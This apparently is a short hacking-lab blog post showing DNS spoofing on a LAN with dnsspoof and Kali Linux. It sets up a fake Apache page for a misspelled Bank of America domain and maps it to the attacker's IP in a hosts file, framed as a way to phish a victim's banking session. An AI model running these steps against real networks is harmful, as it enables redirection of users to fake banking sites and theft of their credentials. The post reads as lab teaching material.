---
layout: post
title: Redirect Access Websites In LAN Using Dnsspoof  
categories: Hacking-Lab
#subtitle: Excerpt from Soulshaping by Jeff Brown
cover-img: /assets/img/path.jpg
thumbnail-img: /assets/img/thumb.png
share-img: /assets/img/path.jpg
tags: [hacking, dnsspoof, redirect dns, dns spoofing ]

---
## Script:  
Attacker and victim in a LAN network together and victim want to access to websites **www.bankofamerica.com** to make transactions.  
Because **www.bankofamerica** is protected by SSL so attacker can not attack by fake **www.bankofamerica.com**  in their computer. So  
they create a websites has the similar name in their computer, call **www.bankofamerrica.com**, then they find the way to seek to  
make someone else visit **www.bankofamerrica.com** instead **www.bankofamerica.com**.  
## 1. Network Model:  
- **Attacker: 192.168.1.92**
- **User: 192.168.1.173 using windows 7 system**  


## 2. Create Webserver:  
We can you service apache2 in kali linux to create a webserver. we should change content of index.html.    
```
vi /var/www/html/index.html
```    
Type: This Is Fake Websites Of www.bankofamerica.com    
![](/assets/img/2020-3-1-index.png)  
```
service apache2 start 
```    

## 3. Attack:  
```
vi /usr/local/hosts
```    
Type: 
```
192.168.1.92  www.bankofamerrica.com
```     
> :warning: **Warning:** use **TAB** between ip and domain.  
```    
dnsspoof -f /usr/local/hosts
```   
## Result:
![](/assets/img/2021-3-1-result.png)  
![](/assets/img/2020-3-1-result-dnsspoof.png)    
DNS query in wireshark:  
![](/assets/img/2021-3-1-show-dns-query.png)  

